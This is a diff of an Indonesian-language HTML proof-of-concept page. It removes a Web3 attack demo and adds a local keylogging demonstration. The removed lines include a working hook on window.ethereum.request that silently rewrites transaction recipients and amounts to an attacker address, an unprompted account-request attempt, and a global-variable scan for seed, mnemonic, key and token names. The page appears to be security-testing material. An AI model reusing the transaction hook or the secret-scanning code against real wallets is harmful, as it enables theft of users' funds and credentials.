@@ -3,137 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Web3 High-Impact Exploitation PoC</title>
+    <title>DOM Event Listener & Keylogging Risk PoC</title>
     <style>
-        body { font-family: Arial, sans-serif; padding: 15px; background: #f4f4f9; color: #333; max-width: 850px; margin: auto; }
+        body { font-family: Arial, sans-serif; padding: 20px; background: #f4f4f9; color: #333; max-width: 800px; margin: auto; }
         .card { background: #fff; padding: 15px; margin-bottom: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        button { padding: 10px 15px; background: #d63031; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 8px; }
-        button.secondary { background: #6c5ce7; }
-        button:hover { opacity: 0.9; }
-        pre { background: #eee; padding: 10px; border-radius: 4px; font-size: 11px; overflow-x: auto; max-height: 160px; }
-        .danger { color: #d63031; font-weight: bold; }
+        input[type="text"] { width: 100%; padding: 10px; margin-top: 8px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }
+        pre { background: #eee; padding: 10px; border-radius: 4px; font-size: 12px; overflow-x: auto; max-height: 180px; }
+        .warning { color: #d63031; font-weight: bold; }
         .success { color: #00b894; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <h2>Advanced High-Impact Exploitation PoC</h2>
-    <p>Simulasi pengujian lanjutan: Parameter Manipulation, Silent Signing Attempt, dan Global Memory Scraping.</p>
+    <h2>DOM Event & Keylogging Exposure PoC</h2>
+    <p>Pengujian ini mendemonstrasikan akses konteks halaman web terhadap pemantauan aktivitas pengetikan (*keyboard events*) pada elemen input di dalam peramban.</p>
 
-    <!-- Modul 1: Parameter Manipulation & Spoofing -->
+    <!-- Modul 1: Deteksi Handler Global -->
     <div class="card">
-        <h3>1. Transaction Parameter Spoofing (Man-in-the-Middle Hook)</h3>
-        <p>Simulasi dApp mengirim dana ke Alamat A (1 ETH), namun di-hook dan diubah diam-diam ke Alamat Penyerang (B).</p>
-        <button onclick="simulateLegitimateTx()">Kirim Transaksi Asli (Akan Dimodifikasi)</button>
-        <pre id="log-spoof">Menunggu simulasi transaksi...</pre>
+        <h3>1. Analisis Properti Global DOM</h3>
+        <pre id="log-handlers">Memindai event handler global...</pre>
     </div>
 
-    <!-- Modul 2: Bypass Approval / Silent Signing -->
+    <!-- Modul 2: Simulasi Pemantauan Input / Keylogging -->
     <div class="card">
-        <h3>2. Automated Silent Signing Test</h3>
-        <p>Menguji apakah fungsi sensitif dapat dipicu otomatis secara beruntun tanpa interaksi persetujuan manual.</p>
-        <button class="secondary" onclick="testSilentSigning()">Coba Eksekusi Silent RPC</button>
-        <pre id="log-silent">Menunggu uji coba silent signing...</pre>
-    </div>
-
-    <!-- Modul 3: Memory & Global Variable Scraping -->
-    <div class="card">
-        <h3>3. Global Memory & DOM Scraping (Seed/Key Search)</h3>
-        <p>Memindai objek global dan struktur memori peramban untuk mendeteksi variabel sensitif yang bocor.</p>
-        <button class="secondary" onclick="runMemoryScraper()">Pindai Variabel Global & Memori</button>
-        <pre id="log-scrape">Hasil pemindaian memori...</pre>
+        <h3>2. Simulasi Intersepsi Input (Keylogger Simulation)</h3>
+        <p>Ketik sesuatu pada kolom di bawah untuk menguji apakah konteks skrip web dapat merekam data masukan:</p>
+        <input type="text" id="test-input" placeholder="Ketik teks rahasia / seed / password di sini...">
+        <pre id="log-keylogger" style="margin-top: 10px;">Belum ada aktivitas ketukan terdeteksi...</pre>
     </div>
 
     <script>
-        const logSpoof = document.getElementById('log-spoof');
-        const logSilent = document.getElementById('log-silent');
-        const logScrape = document.getElementById('log-scrape');
+        const logHandlers = document.getElementById('log-handlers');
+        const logKeylogger = document.getElementById('log-keylogger');
+        const testInput = document.getElementById('test-input');
+        let keyLogs = [];
 
-        // Hook utama untuk Modul 1 (Parameter Manipulation)
-        let attackerAddress = "0xATTACKER_CORRUPT_ADDRESS_BBBBBBBBBBBBBBBBBBBB";
-        
-        if (window.ethereum) {
-            const originalRequest = window.ethereum.request;
-            window.ethereum.request = async function(args) {
-                if (args.method === 'eth_sendTransaction' && args.params && args.params[0]) {
-                    // Simpan nilai asli sebelum dimodifikasi
-                    let intendedTo = args.params[0].to;
-                    let intendedVal = args.params[0].value;
-
-                    logSpoof.innerHTML = `<span class="danger">[INTERCEPT] Transaksi dicegat!\nTujuan Asli: ${intendedTo}\nNilai Asli: ${intendedVal}\n-> Memodifikasi parameter ke dompet penyerang...</span>`;
-
-                    // Modifikasi parameter secara sepihak (Spoofing)
-                    args.params[0].to = attackerAddress;
-                    args.params[0].value = "0xde0b6b3a7640000"; // Contoh override menjadi 1 ETH (dalam Wei)
-                }
-                return originalRequest.apply(window.ethereum, [args]);
-            };
-        }
-
-        async function simulateLegitimateTx() {
-            if (!window.ethereum) {
-                logSpoof.textContent = "Objek window.ethereum tidak ditemukan.";
-                return;
-            }
-            try {
-                logSpoof.textContent = "Mengirimkan transaksi ke Alamat Dummy A...";
-                // Memanggil fungsi kirim transaksi dengan parameter awal (yang akan otomatis di-hook di atas)
-                await window.ethereum.request({
-                    method: 'eth_sendTransaction',
-                    params: [{
-                        from: "0xUSER_WALLET_ADDRESS",
-                        to: "0xVICTIM_DUMMY_ADDRESS_AAAAAA",
-                        value: "0xde0b6b3a7640" // Nominal kecil
-                    }]
-                });
-            } catch (err) {
-                logSpoof.innerHTML += `\n[INFO/ERROR] Respon Native Bridge: ${err.message}`;
-            }
-        }
-
-        async function testSilentSigning() {
-            if (!window.ethereum) return;
-            let logs = [];
-            logs.push("[INFO] Memulai uji coba eksekusi RPC beruntun tanpa interaksi...");
-            
-            try {
-                // Mencoba memicu beberapa metode sensitif secara otomatis
-                const res = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                logs.push(`[+] Akses akun diizinkan secara otomatis: ${JSON.stringify(res)}`);
-            } catch (err) {
-                logs.push(`[-] Silent signing diblokir oleh sistem dompet: ${err.message}`);
-            }
-            logSilent.textContent = logs.join('\n');
-        }
-
-        function runMemoryScraper() {
+        // 1. Memindai keberadaan event listener/handler global
+        function scanGlobalHandlers() {
             let findings = [];
-            findings.push("[INFO] Memindai properti global window untuk kata kunci sensitif...");
+            findings.push("[INFO] Memeriksa event handler standar pada objek window...");
 
-            let sensitiveKeywords = ['seed', 'mnemonic', 'private', 'key', 'secret', 'password', 'auth', 'token'];
-            let foundCount = 0;
+            const handlers = ['onkeydown', 'onkeypress', 'onkeyup'];
+            let detected = 0;
 
-            for (let key in window) {
-                try {
-                    let lowerKey = key.toLowerCase();
-                    for (let word of sensitiveKeywords) {
-                        if (lowerKey.includes(word)) {
-                            findings.push(`[!] <span class="danger">Ditemukan properti global mencurigakan: window.${key}</span>`);
-                            foundCount++;
-                            break;
-                        }
-                    }
-                } catch (e) {
-                    // Lewati properti yang dilindungi lintas domain
+            handlers.forEach(h => {
+                if (h in window) {
+                    findings.push(`[!] <span class="warning">Ditemukan properti global: window.${h} (Akses DOM aktif)</span>`);
+                    detected++;
                 }
+            });
+
+            if (detected > 0) {
+                findings.push(`[+] ANALISIS: Konteks halaman web memiliki kapabilitas penuh untuk mendaftarkan atau memantau interaksi papan ketik (*keylogging*) pada dokumen.`);
             }
 
-            if (foundCount === 0) {
-                findings.push("[+] Tidak ditemukan variabel global berisiko tinggi dengan kata kunci terkait.");
-            }
-
-            logScrape.innerHTML = findings.join('\n');
+            logHandlers.innerHTML = findings.join('\n');
         }
+
+        // 2. Simulasi pemantauan pengetikan (Keylogger Proof-of-Concept)
+        function initKeyloggerSimulation() {
+            testInput.addEventListener('keydown', (event) => {
+                const time = new Date().toLocaleTimeString();
+                // Untuk keamanan, simulasi ini hanya mencatat tombol yang ditekan (bukan mengeksfiltrasi data nyata)
+                keyLogs.unshift(`[${time}] [KEY_EVENT] Tombol ditekan: "${event.key}" (Target elemen input aktif)`);
+                
+                if (keyLogs.length > 10) keyLogs.pop(); // Batasi log
+                logKeylogger.innerHTML = keyLogs.join('\n');
+            });
+        }
+
+        // Jalankan saat DOM dimuat
+        window.addEventListener('DOMContentLoaded', () => {
+            scanGlobalHandlers();
+            initKeyloggerSimulation();
+        });
     </script>
 </body>
 </html>
